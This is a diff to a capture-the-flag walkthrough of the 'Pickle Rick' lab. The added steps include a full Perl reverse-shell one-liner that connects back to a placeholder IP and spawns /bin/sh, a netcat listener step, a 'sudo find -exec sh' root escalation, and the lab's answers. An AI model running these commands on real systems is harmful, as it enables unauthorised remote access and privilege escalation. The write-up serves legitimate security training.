@@ -47,7 +47,31 @@ Whats the second ingredient Rick needs?
     We get a message: Look around the file system for the other ingredient.
     
 2. We need to try to get a reverse shell to check out the file system\
-    We have a command line so we can try to run a reverse shell script
+    We have a command line so we can try to run a reverse shell script\
+    I went to swisskyrepo/PayloadsAllTheThings to find a reverse shell script to use. I used the perl script:\
+    perl -e 'use Socket;$i="IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\
+    Before we run the script in the command panel we need to setup a ncat listener: nc -localhost -port\
+    Now run the perl script and we get a shell
+
+3. Now that we have a shell let's see if we can find the second ingredient\
+    If we cd to the home folder we find a two folders in the rick folder we find the second ingredient: 1 jerry tear
+    
+Whats the final ingredient Rick needs?
+
+1. We can try checking the root folder for the last ingredient: cd root
+    ![Screenshot 2022-01-07 05^%54^%03](https://user-images.githubusercontent.com/86057471/148533787-470fe95c-c962-41ec-9bef-75b18af633da.png)
+    
+    We can't cd to root as www-data user\
+    We can check what sudo privileges we have: sudo -l
+    ![Screenshot 2022-01-07 05^%55^%57](https://user-images.githubusercontent.com/86057471/148534035-c74b090f-94e9-43bc-8f6e-22e1c988d7b3.png)
+    
+    As we see we have all sudo privileges\
+    So we can use any sudo privilage escalation for exampe using find: sudo find /home -exec sh -i \;\
+    Now we run whoami we can see we are root\
+    So let's now check the root folder and we find the third ingredient in 3rd.txt: fleeb juice
+    
+    
+
     
     
 
